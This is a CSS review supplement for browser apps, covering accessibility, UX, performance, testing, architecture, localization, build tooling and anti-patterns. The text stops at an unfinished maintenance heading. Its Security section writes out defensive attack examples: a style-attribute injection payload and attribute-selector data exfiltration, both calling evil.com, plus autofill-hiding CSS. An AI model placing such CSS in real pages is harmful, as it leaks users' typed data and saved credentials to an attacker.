# CSS Language Supplement

These dimensions supplement the standard IAR domain reviews for CSS in browser-rendered application projects. During each domain review, apply the relevant section below in addition to the standard dimensions for that domain. CSS is the presentation layer — what users actually see, the contrast they perceive, the focus rings their keyboard navigation depends on, the spacing that lets them read. This supplement covers CSS as a first-class concern, not as styling-after-the-fact. Read in tandem with [`browser-app.md`](browser-app.md) (the interface-type supplement covering responsive design, accessibility-as-UX, and browser-platform concerns) and [`html.md`](html.md) (the markup supplement covering semantic structure, ARIA, and content) — CSS depends on a sound HTML foundation, and most accessibility CSS dimensions are coupled to the markup CSS targets.

**Multi-domain authoring note:** the sections below were drafted with the relevant role-domain perspectives in mind — [Accessibility](../domains/role/ACCESSIBILITY-REVIEW.md) as the primary domain (CSS is where WCAG 2.1 AA contrast and focus-indicator requirements actually land); [UX](../domains/role/UX-REVIEW.md) (visual hierarchy via typography + spacing; reading patterns; semantic color); [Performance Engineer](../domains/role/PERFORMANCE-ENGINEER-REVIEW.md) (critical CSS, expensive selectors, animations on the compositor); [Security](../domains/role/SECURITY-REVIEW.md) + [Red Team](../domains/role/RED-TEAM-REVIEW.md) (CSS injection in user-controllable contexts, exfiltration patterns); [Quality Engineer](../domains/role/QUALITY-ENGINEER-REVIEW.md) (visual regression testing, stylelint); [Solution Architect](../domains/role/SOLUTION-ARCHITECT-REVIEW.md) (CSS architecture, scoping strategy, design tokens); [Technical Writer](../domains/role/TECHNICAL-WRITER-REVIEW.md) (CSS as documentation — meaningful class names, documented tokens); [Localization](../domains/role/LOCALIZATION-REVIEW.md) (logical properties, bidirectional layout); [Platform Engineer](../domains/role/PLATFORM-ENGINEER-REVIEW.md) (build pipeline). The supplement is forward-looking against the 2026 CSS ecosystem (CSS3 with broad feature support; CSS custom properties; CSS Grid + Flexbox; `@container` queries widely available; `:has()` selector usable in evergreen browsers).

**Scope of this supplement:** any project that ships CSS — author-written `.css` files, CSS-in-JS, CSS Modules, utility-first frameworks ([Tailwind CSS](https://tailwindcss.com/)), preprocessor output (Sass/Less). The dimensions apply regardless of the authoring shape; the artifact-pipeline differences are covered under Platform Engineering. Inline `style="..."` attributes are an anti-pattern (see § Anti-patterns) but if present in a project they are still in scope for this supplement.

---

## Baseline standards

- **CSS3 as the floor** — Target modern CSS3 features that have broad browser support across evergreen Chrome, Firefox, and Safari. CSS Grid, Flexbox, custom properties, logical properties, and `:focus-visible` are all baseline. Vendor prefixes (`-webkit-`, `-moz-`) are still occasionally required (e.g., `-webkit-backdrop-filter` on Safari) but should be applied via [Autoprefixer](https://github.com/postcss/autoprefixer) rather than hand-authored.
- **CSS custom properties (variables) over preprocessor variables** — For design tokens (colors, spacing, typography scales, breakpoints), use native CSS custom properties (`--color-primary: #...; color: var(--color-primary);`) rather than Sass/Less variables. Custom properties cascade, can be overridden per-component, and are introspectable at runtime via `getComputedStyle`. Sass variables are compile-time constants that lose the cascade. New projects should default to custom properties; legacy Sass projects can migrate incrementally.
- **CSS Grid + Flexbox for layout (no floats)** — Layout uses CSS Grid (two-dimensional: grids, page templates) and Flexbox (one-dimensional: nav bars, button rows). `float`-based layout is a 2010-era pattern that's been obsolete since 2017 and is a finding in any new code. `position: absolute` is for overlays and tooltips, not page layout (see § Anti-patterns).
- **Mobile-first responsive** — Author the base styles for the narrowest viewport and add complexity at wider breakpoints via `@media (min-width: ...)`. Mobile-first (`min-width`) is preferred over desktop-first (`max-width`) because the smaller-screen styles are the simpler baseline and the breakpoints add features rather than strip them. Standard breakpoints — `--breakpoint-sm: 640px; --breakpoint-md: 768px; --breakpoint-lg: 1024px; --breakpoint-xl: 1280px` — should be defined as custom properties and referenced consistently.
- **`@media (prefers-color-scheme)` for theme support** — Respect the user's OS-level light/dark preference. Pattern: define color tokens under `:root` for light mode, override under `:root[data-theme="dark"]` AND `@media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) { ... } }`. The user can override the OS preference via an explicit toggle; the OS preference is the default.
- **`@media (prefers-reduced-motion)` for animations** — Every transition and animation must be reduced or eliminated for users who set `prefers-reduced-motion: reduce`. Pattern: `@media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; } }` as a global override, with per-component refinements where a non-zero duration is essential. This is the one acceptable `!important` use case (overriding decorative motion is the named exception). See [Accessibility](#accessibility) below for the WCAG-side framing.
- **Box-sizing reset** — Apply `*, *::before, *::after { box-sizing: border-box; }` as a project-wide reset. The browser default (`content-box`) is a footgun — width calculations that ignore padding and border lead to layout drift. `border-box` is the modern default that every reset stylesheet ([normalize.css](https://necolas.github.io/normalize.css/), [modern-normalize](https://github.com/sindresorhus/modern-normalize)) applies.

## Accessibility

CSS is the primary surface for several WCAG 2.1 Level AA requirements. The Accessibility domain is the primary owner of these dimensions; the CSS supplement names the implementation patterns.

- **Color contrast (WCAG 2.1 AA)** — Text contrast must meet 4.5:1 for normal text and 3:1 for large text (18pt+ or 14pt+ bold). UI component boundaries (input borders, button borders, focus indicators) must meet 3:1 against adjacent colors. Test every color pair the design produces, INCLUDING hover, focus, active, disabled, and error states. Named failure modes: `color: #777` on `#fff` background (4.48:1 — just under threshold, fails); placeholder text using `color: #ccc` (1.61:1 — fails); disabled-state text that's "obviously disabled" but unreadable. Use a contrast checker ([WebAIM Contrast Checker](https://webaim.org/resources/contrastchecker/), browser devtools accessibility panel) rather than visual judgment. Encode the contrast budget in design-token names — `--text-primary` and `--text-secondary` should both be contrast-validated against `--bg-primary`.
- **Focus-visible styles — never remove them** — Every interactive element (link, button, input, custom widget) must have a visible focus indicator with at least 3:1 contrast against the adjacent background AND at least 2px thickness. Use `:focus-visible` (not `:focus`) so mouse-clicks don't leave focus rings on buttons but keyboard navigation does. Named failure modes: `*:focus { outline: none; }` global override (removes focus indicators from every element — a Section 508 / WCAG 2.4.7 failure); `outline: 0` on individual elements without a replacement `:focus-visible` style; `:focus { outline: none; } :focus-visible { outline: ... }` without verifying the `:focus-visible` style is actually visible. The rule: if you remove the default focus ring, you owe a replacement that is at least as visible.
- **Reduced-motion preferences** — See § Baseline standards. Beyond the global override, audit each animation/transition: is the motion decorative (a finding to suppress) or functional (a finding to provide an alternative)? A loading spinner with `animation: spin 1s linear infinite` is functional — under `prefers-reduced-motion: reduce`, provide a non-animated affordance (text "Loading..."), don't just freeze the spinner.
- **Touch target size — 44×44 CSS pixel minimum** — Per WCAG 2.5.5 (Level AAA, but the suite recommends as a floor), interactive elements should have a touch-target hit area of at least 44×44 CSS pixels. Small visual elements can use `padding` to expand the hit area beyond the visual bounds, or `::before`/`::after` pseudo-elements with absolute positioning to expand it. Named failure modes: 16×16 close-button icons in modal corners; 24×24 social-icon links; tab-bar items sized to text-width only. The check: in browser devtools, hover the element and confirm the rendered box is at least 44×44.
- **Zoom and text resize** — At 200% browser zoom and 200% text size, content must remain readable and functional without horizontal scrolling (WCAG 1.4.4, 1.4.10). Use `rem`/`em` units (relative to root or parent font-size) rather than `px` for text and most spacing. Test by setting browser zoom to 200% and resizing the viewport.
- **Text-spacing override** — Users can override CSS text-spacing properties via assistive technology (WCAG 1.4.12). Layouts must not break when line-height ≥ 1.5, letter-spacing ≥ 0.12em, word-spacing ≥ 0.16em, paragraph-spacing ≥ 2× font-size are applied. Avoid fixed-height containers for text content; use `min-height` instead.
- **Color not the sole carrier of information** — A form field marked "required" with only `color: red` on the label is invisible to colorblind users and to screen readers. Pair color with text (`<span class="required">*</span>`), icon, or other modality. CSS-side check: any property using `color`, `background-color`, or `border-color` to convey semantic meaning (error / warning / success / required) should have a non-color companion.

## UX

CSS implements the visual design system. UX dimensions evaluate whether that system serves the user's reading and interaction patterns.

- **Visual hierarchy via typography + spacing** — The user's eye should land on the most important content first. CSS controls this through font-size scale, weight contrast, and whitespace. Named failure modes: every heading uses the same size (no hierarchy); body text and metadata are the same weight (no priority signal); inadequate whitespace between sections (no reading rhythm). Establish a typographic scale (e.g., 1.250 — major third — for a moderate scale; 1.500 — perfect fifth — for a dramatic scale) and apply it consistently via custom properties (`--text-sm`, `--text-base`, `--text-lg`, `--text-xl`, `--text-2xl`).
- **F-shape / Z-shape reading patterns** — Western readers scan left-to-right, top-to-bottom in F-shaped or Z-shaped patterns. Critical content (primary CTA, key value proposition, navigation) belongs in the path that pattern traces. Test by squinting at the page: what do you see? If the most important thing isn't the first thing the eye lands on, the visual hierarchy is wrong regardless of CSS technical correctness.
- **Consistent spacing scale** — Whitespace is a visual language. Use a spacing scale (e.g., 4px base: `--space-1: 0.25rem; --space-2: 0.5rem; --space-3: 0.75rem; --space-4: 1rem; --space-6: 1.5rem; --space-8: 2rem`) and apply it consistently. Named failure modes: `margin: 13px` here, `margin: 14px` there — arbitrary magic numbers that betray no underlying system; padding values copy-pasted from design mockups without normalization; spacing inconsistent between equivalent UI surfaces (the gap between cards in one section is 16px, in another 20px).
- **Semantic color** — Color carries cultural and convention meaning. Red = destructive / error; green = success / confirmation; yellow/orange = warning; blue = informational / link. Custom-property naming should encode the semantic role (`--color-destructive`, `--color-success`, `--color-warning`, `--color-info`) not the hex value (`--color-red-500`). The hex-value form forces every consumer to know the convention; the semantic form lets the convention update centrally.
- **Hover, focus, active, disabled state coverage** — Every interactive element needs distinct visual treatments for these states. Named failure modes: `:hover` styled but `:focus` ignored (keyboard users have no feedback); `:disabled` rendered identically to enabled (the user can't tell whether the button is clickable); `:active` (the brief pressed state) absent (no tactile feedback on click). The default browser styles are inadequate for custom-styled buttons — once you style the resting state, you own all four.
- **Loading and skeleton states** — Async operations need visible CSS treatment. Skeleton screens (animated gradient placeholders) communicate progress better than blank space. CSS-only spinners (`@keyframes spin`) are fine; ensure `prefers-reduced-motion` provides an alternative (see [Accessibility](#accessibility)). A UI that's "frozen" during a fetch (no skeleton, no spinner, no progress) is a UX failure — the user can't tell whether anything is happening.

## Performance Engineer

CSS performance has two dimensions: render-blocking (the CSS the browser must parse before first paint) and runtime cost (selector evaluation, layout, paint, composite).

- **Critical CSS inlined; non-critical deferred** — CSS in `<head>` blocks rendering until parsed. The "critical" CSS — the subset needed for above-the-fold content — should be inlined in a `<style>` tag in `<head>`; the rest deferred via `<link rel="stylesheet" media="print" onload="this.media='all'">` or asynchronously loaded. Tools: [critical](https://github.com/addyosmani/critical) extracts above-the-fold CSS automatically. Measure with [Lighthouse](https://developers.google.com/web/tools/lighthouse) Largest Contentful Paint (LCP) — a 200KB synchronous stylesheet adds significant render-blocking time on slow connections.
- **Avoid expensive selectors** — Browsers evaluate selectors right-to-left. The universal selector (`*`) chained with descendant combinators (`*` + descendant) — e.g., `div * span` — forces the browser to consider every span and walk every ancestor. Other expensive patterns: deeply-nested selectors (`.foo .bar .baz .qux .quux`); attribute selectors with leading wildcards (`[class*="prefix-"]`); `:has()` on large subtrees. Modern browsers optimize most cases well; the rule is "don't gratuitously create work" not "every selector must be one class."
- **`will-change` sparingly** — `will-change: transform` hints to the browser that a property will animate, promoting the element to its own compositor layer. Applied broadly (`* { will-change: transform; }`), it exhausts GPU memory and slows down the page. Apply only to elements that ARE about to animate, and remove it after the animation completes. Named failure mode: `will-change: transform` on a static element "for future-proofing."
- **Transform/opacity over layout/paint properties for animations** — Animating `width`, `height`, `top`, `left`, `margin`, `padding` triggers layout (reflow) — expensive. Animating `background-color`, `color`, `border-color` triggers paint — moderately expensive. Animating `transform` (translate, scale, rotate) and `opacity` runs on the compositor — cheap, 60fps achievable. Named failure mode: a card hover effect that animates `width` (causes neighbors to reflow) instead of `transform: scale(...)` (animates in place on the compositor). Apply `transform: translate(...)` for movement, `transform: scale(...)` for size changes, `opacity` for fades.
- **`content-visibility: auto` for off-screen sections** — For long pages with many off-screen sections, `content-visibility: auto` defers rendering and layout of off-screen content until it scrolls into view. Use with `contain-intrinsic-size` to reserve space and prevent scroll jumps. Measure impact via Lighthouse before adopting broadly — the property is most valuable for very long content (lists with hundreds of items).
- **Font loading strategy** — Web fonts add render-blocking weight. Use `font-display: swap` in `@font-face` (browser shows fallback text immediately, swaps to web font when loaded) or `font-display: optional` (shorter timeout, falls back permanently if slow). Preload critical fonts via `<link rel="preload" as="font" crossorigin>`. Avoid `font-display: block` (default in some browsers) — it causes invisible text during font load.
- **CSS file size budget** — Track total CSS shipped per route. A portfolio project's CSS bundle should be well under 100KB minified+gzipped; a 500KB CSS bundle is a finding regardless of framework. Use Lighthouse "Reduce unused CSS" audit and tools like [PurgeCSS](https://purgecss.com/) (or Tailwind's built-in JIT) to remove unused rules.

## Security

CSS is less commonly thought of as a security surface than JavaScript, but injection and exfiltration vectors exist and are worth naming.

- **CSS injection in user-controllable contexts** — If user-supplied data is interpolated into a `style` attribute or a `<style>` block, CSS injection is possible. Named worked attack: a chat application embeds `<div style="background: ${user_color}">` without sanitization; `user_color = "red; } body { background: url('https://evil.com/exfil?data=...'); } div {"` breaks out of the rule and adds attacker-controlled CSS to the page. Defense: never interpolate user input into style attributes; if dynamic styling is needed, set discrete properties via `element.style.setProperty(name, value)` (where `value` is validated against an allowlist).
- **CSS exfiltration via attribute selectors + background-image** — A classic CSS-only data-exfiltration attack: `input[value^="a"] { background: url('https://evil.com/log?c=a'); } input[value^="b"] { background: url('...?c=b'); } ...` lets attacker-controlled CSS exfiltrate the contents of an input by triggering different background URLs per first-character match. Combined with `@import url('https://evil.com/next-step.css')`, the attack can iterate character-by-character. Defense: a Content Security Policy that restricts `style-src` to `'self'` (no inline styles, no untrusted stylesheet sources) and `connect-src`/`img-src` allowlists. See [`browser-app.md`](browser-app.md) § Security for the CSP-overall framing.
- **`@import url(...)` from untrusted sources** — `@import url('https://evil.com/styles.css')` pulls a stylesheet from an arbitrary origin and applies it to the page. Like third-party scripts, third-party stylesheets are a trust delegation. Use Subresource Integrity (`<link rel="stylesheet" integrity="sha384-..." crossorigin="anonymous">`) for any CDN-hosted CSS; avoid `@import` of remote URLs entirely.
- **`url()` in user-controllable styles** — `background-image: url('${user_url}')` lets the user trigger requests to arbitrary URLs from the user's browser — potential CSRF / SSRF / tracking-pixel vector. Same rule as above: never interpolate user input into CSS `url()` values without validation against an allowlist of trusted origins.
- **Browser autofill data leak** — Browsers autofill saved credentials into forms based on field-name heuristics. Custom CSS that hides autofilled fields (`input:-webkit-autofill { display: none; }`) can be used by attackers to extract autofilled data invisibly. The defensive principle: scrutinize any CSS that interacts with form-input rendering against attacker intent.

## Quality Engineer

CSS quality is regression-prone — a small rule change can silently shift layout across the application. Visual regression testing and lint-level enforcement are the two pillars.

- **Visual regression testing** — Capture screenshots of key UI states at known viewports and assert byte-equal (or perceptual-diff) against a baseline on every commit. Tools: [Percy](https://percy.io/) (hosted, cross-browser); [Chromatic](https://www.chromatic.com/) (Storybook-integrated); [Playwright](https://playwright.dev/) (`page.screenshot()` + a diff library like [pixelmatch](https://github.com/mapbox/pixelmatch) or [Argos CI](https://argos-ci.com/)). For a portfolio project, Playwright screenshots checked into the repo with a tolerance threshold are sufficient — the test runs locally and in CI, no hosted service required. Capture at multiple viewports (mobile 360px, tablet 768px, desktop 1280px) and at multiple states (default, hover, focus, error).
- **`stylelint` for CSS quality** — [stylelint](https://stylelint.io/) is the canonical CSS linter — analogous to ESLint for JavaScript. Config: extend `stylelint-config-standard` as a baseline; add `stylelint-config-recess-order` for property-order consistency; add `stylelint-no-unsupported-browser-features` if the project has a defined browserslist. Invocation: `stylelint "src/**/*.css"` (lint); `stylelint "src/**/*.css" --fix` (auto-fix). Treat warnings as build failures in CI.
- **Accessibility automated scanning catches contrast** — [axe-core](https://github.com/dequelabs/axe-core) and [Lighthouse](https://developers.google.com/web/tools/lighthouse) report color-contrast violations as part of their accessibility audits. Wire one of them into CI (`axe-playwright` for Playwright integration; Lighthouse CI for standalone audits). A passing axe run catches the obvious contrast failures; manual contrast review (see [Accessibility](#accessibility)) catches the dynamic and state-dependent ones.
- **Cross-browser testing** — CSS behavior diverges across Chrome, Firefox, and Safari more than JavaScript does (subtle differences in flexbox edge cases, form-control default styling, `gap` support, scroll behavior). Run the visual-regression suite against all three browsers; document any known divergences. [Playwright](https://playwright.dev/) supports all three via a single test runner.
- **Responsive design testing** — Visual regression should capture at least three viewport widths: narrow mobile (360px), tablet (768px), desktop (1280px). Touch-target size and reflow behavior are checked at the mobile width; multi-column layout and breakpoint transitions at the tablet width.
- **CSS unit testing not a thing** — Unlike JavaScript, CSS doesn't have a "unit test" abstraction — there's no pure function to assert on. The closest analogue is visual regression at the component level (one screenshot per component in isolation, via Storybook or a static fixture page). Don't try to invent a CSS unit-test framework; rely on visual regression + stylelint + accessibility scanning instead.

## Solution Architect

CSS architecture is the project-level decision that scales (or doesn't) with the codebase.

- **CSS architecture choice — BEM / CSS Modules / utility-first** — There are three viable patterns for component-scoped CSS:
  - **BEM** (Block-Element-Modifier — `.card__title--featured`) — long-standing convention; works with any tooling; relies on naming discipline rather than tool enforcement.
  - **CSS Modules** — file-scoped class names (`.title` in `Card.module.css` becomes `Card_title_a1b2c3` at build time); enforced by tooling; works with React/Vue/Svelte component frameworks.
  - **Utility-first** ([Tailwind CSS](https://tailwindcss.com/) and similar) — composition of single-purpose classes (`class="text-lg font-bold p-4"`); near-zero custom CSS; design constraints encoded in the framework config.
  Each is valid; the choice depends on the rest of the stack. A project mixing all three for the same concern without rationale is a finding.
- **Naming conventions** — Whichever architecture is chosen, naming is consistent project-wide. BEM uses `block__element--modifier`. Utility-first uses the framework's vocabulary. CSS Modules uses camelCase or kebab-case per project convention. Named failure modes: a mix of `.cardTitle` and `.card-title` and `.card_title` in the same project; ad-hoc class names that don't follow any convention (`.bigGreenText`, `.thatOneSection`).
- **Scoping strategy** — Are styles scoped to the components that own them, or global? Global styles (a single `app.css` containing every rule) become un-refactorable beyond a small project — changing `.button` somewhere affects every button everywhere. Component-scoped CSS (CSS Modules, scoped CSS in Vue/Svelte) limits the blast radius. For a portfolio project, the minimum is: a small `base.css` for resets and design tokens, then per-component CSS files. Avoid `style="..."` inline (see § Anti-patterns).
- **Design tokens via CSS custom properties** — Design tokens (colors, spacing, typography, breakpoints, shadow scales, border radii) live in CSS custom properties under `:root` in a `tokens.css` file. Every other stylesheet references them by name. Named failure modes: hex codes repeated across files (`color: #336699` in 12 places); spacing values inconsistent (`padding: 16px` here, `padding: 1rem` there, `padding: 1em` somewhere else). Tokens are the single source of truth.
- **Cascade and specificity discipline** — CSS specificity is the source of most "why isn't my style applying?" debugging time. Discipline: keep specificity flat (one class per selector); avoid ID selectors (`#thing` — overly specific); avoid `!important` except for the one named exception (reduced-motion override). When specificity wars start, the architecture is the problem — refactor toward lower-specificity scoping rather than escalating to `!important`.
- **Module structure scales with project size** — For a 100-line CSS project, one file is correct. For a 1000-line project, split by component (`button.css`, `card.css`, `form.css`) plus `tokens.css` and `base.css`. For a 10000-line project, organize by feature or bounded context (`features/auth/auth.css`, `features/dashboard/dashboard.css`). A 100-line project split into 12 files is over-engineering; a 5000-line single CSS file is under-engineering.

## Technical Writer

CSS is documentation when its identifiers carry meaning, and rot when they don't.

- **Meaningful class names** — Class names should describe purpose, not appearance. `.primary-button` describes role (the user understands what it is for); `.blue-button` describes appearance (and breaks when the design changes the color to green). Named failure modes: `.big-text`, `.left-thing`, `.section1`, `.div5` — these are documentation absence. The test: can a reader infer the class's role from its name without reading the rules?
- **Documented design tokens** — The `tokens.css` file is the project's design documentation. Each token deserves a comment explaining its semantic role (`/* --color-destructive: red, used for delete confirmations and error states */`). A token file with only hex codes and no comments is undocumented.
- **CSS comments for non-obvious decisions** — When a rule exists for a non-obvious reason — a browser bug workaround, a magic-number that came from a specific design measurement, a hack to defeat a specific edge case — document it in a comment. Pattern: `/* Safari 16 misrenders flex-gap with sticky positioning — workaround: use margin */`. Comments are the load-bearing documentation for the next maintainer who'd otherwise "clean up" the workaround.
- **Component-to-CSS mapping documented** — In CSS Modules or BEM projects, the mapping between a component file and its stylesheet should be discoverable. CSS Modules makes this implicit (the import in the component file). BEM relies on convention — name the stylesheet after the block (`card.css` contains `.card`, `.card__title`, etc.). A reader navigating the project should be able to find the CSS for a component without grepping.
- **README integration** — For projects with non-trivial CSS architecture, a README section describing the CSS organization (BEM? CSS Modules? Tailwind?) and how to add new styles is the difference between "new contributor productive in 30 minutes" and "new contributor introduces inconsistencies that survive review."

## Localization

CSS makes assumptions about reading direction, text expansion, and locale-specific formatting. RTL-language support and Asian-language layout are the two most common failure surfaces.

- **Logical properties over physical properties** — Use `margin-inline-start` (not `margin-left`), `padding-block-end` (not `padding-bottom`), `border-inline-start-color` (not `border-left-color`), `inset-inline-start` (not `left`). Logical properties flip automatically under `dir="rtl"`; physical properties don't. Named failure mode: a card with `padding-left: 1rem` for an icon — when the app is translated to Arabic and the page direction flips, the icon is now on the right but the padding is still on the left, breaking the layout.
- **`text-align: start` / `end` over `left` / `right`** — `text-align: start` aligns to the reading direction's start (left for LTR, right for RTL). `text-align: left` always aligns left, regardless of direction.
- **Bidirectional layout support** — If the application supports RTL languages (Arabic, Hebrew, Persian, Urdu), test the entire UI with `<html dir="rtl">` applied. Named failure modes: icons that should mirror (a "next" arrow that points right in LTR should point left in RTL) don't; flexbox `flex-direction: row` lays out children left-to-right unconditionally (should flip in RTL — `row` behaves correctly when using `flex-start`/`flex-end` keywords; `left`/`right` keywords don't flip); decorative borders only on one side that should mirror.
- **Text expansion budget** — Translated text expands. German is often 30% longer than English; some languages routinely double the text length. CSS that uses fixed widths (`width: 100px`) for text containers breaks when the translation overflows. Use `min-width` and let containers grow; use `text-overflow: ellipsis` with `overflow: hidden` only when truncation is acceptable.
- **`line-height` and Asian-language layout** — CJK (Chinese / Japanese / Korean) characters render taller than Latin characters. A `line-height: 1.2` that looks fine in English may produce cramped CJK text. Test with representative CJK content; consider `line-height: 1.5` or higher as the floor for multilingual projects.
- **Locale-aware number formatting via `text-transform`** — `text-transform: uppercase` doesn't always do the right thing across locales (Turkish dotted-i, German eszett). Where possible, ship pre-cased content from the localization framework rather than relying on CSS to case-transform.

## Platform Engineer

The CSS build pipeline transforms author-source CSS into production-shipped CSS with autoprefixing, minification, and source maps.

- **[PostCSS](https://postcss.org/) as the build pipeline** — PostCSS is the canonical CSS transformation framework — plugins for autoprefixing, nesting, custom-property polyfills, minification, and many other transforms. Standard plugin set: `autoprefixer` (vendor prefixes from browserslist), `postcss-preset-env` (modern CSS features for older browsers), `cssnano` (minification). Invocation typically via the project's bundler ([Vite](https://vitejs.dev/), [esbuild](https://esbuild.github.io/), webpack) which integrates PostCSS by default.
- **[Autoprefixer](https://github.com/postcss/autoprefixer) for vendor prefixes** — Don't hand-author `-webkit-`, `-moz-`, `-ms-` prefixes. Autoprefixer reads the project's [browserslist](https://github.com/browserslist/browserslist) config (`"> 0.5%, last 2 versions, not dead"` is a common default) and adds the prefixes that the targeted browsers need. As browser versions advance, the prefix set shrinks automatically.
- **[cssnano](https://cssnano.co/) for minification** — `cssnano` minifies CSS for production: removes whitespace, shortens hex colors (`#ffffff` → `#fff`), removes redundant prefixes, collapses adjacent rules. Apply in the production build only — development builds should ship readable CSS.
- **Source maps in development** — `cssnano` and PostCSS in general should emit source maps in development builds so devtools point to the original source files, not the bundled output. Disable source maps in production (or ship them to a separate file referenced via `# sourceMappingURL=` comment loaded only when devtools are open).
- **Browserslist as the canonical browser-target config** — A single `browserslist` config (in `package.json` or `.browserslistrc`) is the source of truth for which browsers the project supports. Autoprefixer reads it, Babel/SWC read it, stylelint reads it, ESLint reads it. Named failure mode: prefixes hardcoded for IE11 in CSS while the browserslist target doesn't include IE11 (drift between intent and output).
- **Critical CSS extraction in build** — For projects optimizing LCP, the build pipeline should extract critical CSS (above-the-fold rules) and inline it. Tools: [critical](https://github.com/addyosmani/critical), [Critters](https://github.com/GoogleChromeLabs/critters). Apply only if Lighthouse identifies render-blocking CSS as a measurable problem — premature critical-CSS optimization adds build complexity for unclear gain.
- **Pre-commit hook patterns** — Standard hooks: `stylelint --fix` on staged `.css` files; `prettier --write` for formatting; visual-regression snapshot capture on opt-in. Wire via [pre-commit](https://pre-commit.com/) or [husky](https://typicode.github.io/husky/) + [lint-staged](https://github.com/lint-staged/lint-staged). Named failure modes: pre-commit configured but only locally (CI doesn't re-run); pre-commit hooks installed but not pinned to specific versions (drift between contributors).
- **CI gates on CSS** — In CI: `stylelint` (lint), `prettier --check` (formatting), visual-regression tests (Playwright screenshots), accessibility scan (axe-core or Lighthouse). A green CI on a CSS change should mean the styles lint clean, format clean, render without regression, and pass automated accessibility checks.

---

## Tooling

- **[stylelint](https://stylelint.io/)** — The canonical CSS linter. Config: `stylelint-config-standard` as the baseline; add `stylelint-config-recess-order` for property-order consistency. Treat warnings as build failures in CI.
- **[Prettier](https://prettier.io/)** — The opinionated formatter. Handles CSS, SCSS, Less, and CSS-in-JS uniformly. Run as a pre-commit hook (`prettier --write "src/**/*.css"`) and as a CI check (`prettier --check "src/**/*.css"`).
- **[PostCSS](https://postcss.org/) + [Autoprefixer](https://github.com/postcss/autoprefixer) + [cssnano](https://cssnano.co/)** — The build-pipeline triple. PostCSS as the framework; Autoprefixer for vendor prefixes; cssnano for minification. See [Platform Engineering](#platform-engineer) above.
- **[Lighthouse](https://developers.google.com/web/tools/lighthouse)** — The Google-published audit tool. Reports on performance (LCP, CLS, render-blocking CSS), accessibility (contrast, focus indicators, semantic HTML), and best practices. Run locally via Chrome devtools or in CI via [Lighthouse CI](https://github.com/GoogleChrome/lighthouse-ci). Track Lighthouse scores as a CI gate (e.g., performance >= 90, accessibility >= 95).
- **[axe-core](https://github.com/dequelabs/axe-core) / [axe-playwright](https://github.com/abhinaba-ghosh/axe-playwright)** — Accessibility scanning. Catches contrast violations, missing focus indicators, and most WCAG-rule failures that CSS owns. See [Quality Engineer](#quality-engineer) above.
- **[WebAIM Contrast Checker](https://webaim.org/resources/contrastchecker/)** — Web-based contrast-ratio calculator. Useful for verifying specific color-pair contrast values during design and review.
- **Browser devtools accessibility panels** — Chrome, Firefox, and Safari devtools all expose accessibility inspection panels with contrast-ratio readouts on every element. The fastest way to verify a contrast value in the actual rendered context.
- **[Percy](https://percy.io/) / [Chromatic](https://www.chromatic.com/) / [Playwright](https://playwright.dev/) screenshots** — Visual regression testing. Percy and Chromatic are hosted services; Playwright is open-source and runs locally + in CI. Capture across mobile / tablet / desktop viewports and across Chrome / Firefox / Safari.
- **Pre-commit hook patterns** — Via [pre-commit](https://pre-commit.com/) or husky + lint-staged: run `stylelint --fix` and `prettier --write` on staged CSS files; optionally invoke axe-core on local dev-server output before allowing a commit. Pin tool versions so contributors run identical configurations.

---

## Anti-patterns

The named CSS anti-patterns. Each is a finding for any project past prototype scope; each has a documented better shape.

- **`!important` overuse** — `!important` overrides cascade and specificity. Used broadly, it makes CSS unmaintainable — every override needs its own `!important` to win, and specificity wars escalate without bound. The one acceptable use is overriding decorative animations under `prefers-reduced-motion: reduce` (see [Baseline standards](#baseline-standards)); every other use is a finding. The better shape: refactor the conflicting rules to use lower-specificity selectors or restructure the cascade.
- **`position: absolute` for layout** — `position: absolute` removes the element from normal document flow. For overlays, tooltips, and small repositioning relative to a parent, this is correct. For page layout (sidebars, columns, content regions), it's wrong — the absence from flow means neighbors don't reflow around it, and responsive behavior requires manual JavaScript intervention. Use Grid or Flexbox for layout; reserve `position: absolute` for genuine overlays.
- **Pixel-only sizing (no `rem`/`em`)** — `font-size: 14px`, `padding: 16px`, `margin: 24px` — all pixels, all immune to the user's text-size preference. A user who configures the browser for larger text gets the larger text on a page that uses `rem` (relative to root font-size, which the user-pref controls); they get nothing on a page that uses `px`. Use `rem` for typography and most spacing; `em` for properties that should scale with the element's own font-size (e.g., `padding: 0.5em 1em` on a button); `px` only for borders, hairlines, and other truly fixed pixel-quantities.
- **Fixed widths without responsive consideration** — `width: 1200px` on a top-level container makes the page require horizontal scroll on any viewport narrower than 1200px. Use `max-width` (the page is 1200px MAX, but narrower when the viewport is narrower) and let the layout flow. Same for cards, modals, and any container that should adapt.
- **Magic numbers without custom-property naming** — `margin-top: 73px`. Why 73? No one knows. The replacement: define `--space-card-top: 4.5rem` (or whatever the design system specifies) and reference it. The custom-property name carries the meaning; the raw number does not.
- **Selector specificity wars** — A rule using `body div.container .panel section.featured > .button:not(.disabled)` is specificity-overweighted as a defensive measure. Subsequent rules need equal or greater specificity to override, escalating across the codebase. The better shape: low-specificity selectors throughout, organized by architecture (BEM / Modules / utility-first) so override is a structural decision not a specificity arms race.
- **Inline `style="..."` attributes** — `style` attributes have the highest specificity short of `!important` and bypass the project's stylesheets entirely. They're an escape hatch that becomes a graveyard of one-off rules. Acceptable uses: programmatically-set values that vary per-instance (e.g., `style="--user-color: ${validated_color}"` setting a custom property the stylesheet reads); inline SVG fill/stroke for icon coloring. Unacceptable: any rule that could live in a stylesheet.
- **`@import` of remote stylesheets** — Render-blocking, no integrity check, supply-chain risk. Use `<link rel="stylesheet" integrity="..." crossorigin="anonymous">` for CDN-hosted CSS; bundle and self-host wherever possible.
- **`* { all: unset }` or aggressive resets** — Modern projects should use a targeted normalize stylesheet ([modern-normalize](https://github.com/sindresorhus/modern-normalize)) plus opt-in resets per element, not a nuclear `* { all: unset }` that destroys every default and forces every component to redeclare every property.
- **Animating layout/paint properties** — Animating `width`, `height`, `top`, `left` causes reflow; animating `background-color`, `color` causes paint. Both are expensive. Animate `transform` and `opacity` instead — they run on the compositor at 60fps. See [Performance Engineer](#performance-engineer) above.
- **Color as the sole information carrier** — A "required" indicator that's only a red asterisk; a "selected" state that's only a blue background. Invisible to colorblind users and screen readers. Pair color with text, icon, border-style, or other non-color modality. See [Accessibility](#accessibility) above.

## Maintenance

Update this supplement when:

